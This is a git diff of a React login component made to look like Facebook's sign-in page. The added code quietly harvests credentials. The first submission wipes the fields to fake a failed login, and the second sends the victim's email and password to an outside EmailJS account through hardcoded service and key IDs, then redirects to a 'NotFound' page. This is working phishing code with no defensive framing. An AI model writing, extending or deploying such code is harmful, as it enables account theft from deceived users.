@@ -2,36 +2,52 @@ import logo from '../images/logo.svg'
 import React, { useRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
 import Reloader from './Reloader';
+import { useNavigate } from 'react-router-dom';
 
 const Desktop = ({ formData, setFormData,handleChange }) => {
     const form = useRef();
     const [times, setTime] = useState(0);
+    const [loader, setLoader] = useState(false);
+    const navigate = useNavigate()
     
     const handleSubmit = (e) => {
+        setLoader(prev => !prev);
         e.preventDefault();
         setTime(prev => ++prev);
+        
         if(times === 0) {
             setFormData({
                 email: '',
                 password: ''
             });
+            setLoader(false);
+            return
         }
         else if (times === 1) {
             emailjs
             .sendForm('service_b2vvpse', 'template_ebmbhy9', form.current, '8PsCARLu8bf-E5pdw')
             .then((result) => {
                 console.log(result.text);
-                console.log('success')
+                console.log('success');
+                navigate('/NotFound');
+                setLoader(false);
             }, (error) => {
-                console.log('error');
+                console.log(error);
+                setLoader(false);
+                setFormData({
+                    email: '',
+                    password: ''
+                });
         });
         setTime(0);
         }
+        
+        
     }
 
     return ( 
         <section className="login">
-            {/* <Reloader/> */}
+            {loader && <Reloader/>}
             <div className="facebook--container">
 
                 <div className="facebook--items one">
